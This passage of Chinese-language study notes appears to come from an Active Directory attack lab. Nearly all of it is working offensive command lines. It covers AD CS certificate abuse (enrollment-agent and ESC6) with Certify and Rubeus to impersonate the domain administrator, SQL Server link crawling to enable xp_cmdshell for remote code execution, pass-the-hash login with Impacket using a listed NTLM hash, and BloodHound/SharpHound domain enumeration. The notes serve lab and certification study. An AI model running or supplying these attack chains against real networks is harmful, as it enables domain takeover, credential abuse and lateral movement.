		- `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcertpw:123 /enrollcert:openssl\cert.pfx`
			- `onbehalfof` : on behalf of = 代表誰
			- `enrollcertpw` : openssl 的密碼
	- 再用 OpenSSL 轉換
		- `pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
	- 請求 TGT
		- `..\Rubeus.exe asktgt /user:dcorp\administrator /certificate:cert.pfx /password:123 /domain:dollarcorp.moneycorp.local /ptt`

### ESC6
- 條件
	- 使用者的 SAN 有 `EDITF_ATTRIBUTESUBJECTALTNAME2`
		- 可以用 `Certify.exe find`
		- 或是 Certutil `certutil -config mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA -getreg "policy\EditFlags"`
	- 找任意一個 `mspki-certificate-application-policy` 有 `Client Authentication` 的 Template

- 步驟
	-  `Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:CA-Integration /altname:mcorp\administrator`
	- 再用 OpenSSL 轉換
	- 請求 TGT

## MSSQL
- PowerSQL
	- `Import-Module .\PowerUpSQL-master\PowerUpSQL.ps1`
	- 列出 MSSQL 在 Domain 的 Instance 
		- `Get-SQLInstanceDomain`
	- 列出 Server 狀態
		- `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
	- Server 連線測試
		- `Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded`
	- 普通 SQL Query
		- `Get-SQLQuery -Instance dcorp-mssql -Query 'SELECT * FROM master..sysservers'`
	- Trust Link
		- 列舉 Trust Link
			- `Get-SQLServerLink -Instance dcorp-mssql`
		- Trust Link 串串樂
			- `Get-SQLServerLinkCrawl -Instance dcorp-mssql`
			- 串串樂 RCE
				- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'')'`
				- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"`
	- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql
- 手動可以用 Hedisql
	- Network Type: `Microsoft SQL Server (TCP/IP)`
	- Use Windows authentication 
	- Trust Link
		- `SELECT * FROM master..sysservers`
		- `SELECT * FROM openquery("第一台", 'SELECT * FROM master..sysservers')`
			- 單雙引號有差
		- `SELECT * FROM openquery("dcorp-sql1", 'SELECT * FROM openquery("dcorp-mgmt", ''SELECT * FROM master..sysservers'')')`
			- ...... 一直下去，在 `'` 裡面要用到 `'` 就用兩個 (`''`)
- Impacket MSSQLClient
	- 如果直接登入怪怪的，可以試著 PTH 登入 (Mac 怪怪的就用 Kali)
		- `mssqlclient.py -windows-auth dcorp/student365@12.16.3.21 -hashes  :97f15786865912b818ca69b03f09d84f`


## Blood Hound
- Neo4j
	- neo4j-community-5.10.0
		- `neo4j.bat windows-service install`
		- `neo4j.bat start`
	- 會自動開啟 `http://localhost:7474`
		- 預設密碼 `neo4j` / `neo4j`
		- 修改成 `neo4j` / `1qaz@WSX`
- 目前最新版有一些 Bug，建議使用 4.0.3
- SharpHound
	- `Import-Module .\SharpHound.ps1`
	- `Invoke-BloodHound -CollectionMethod All`
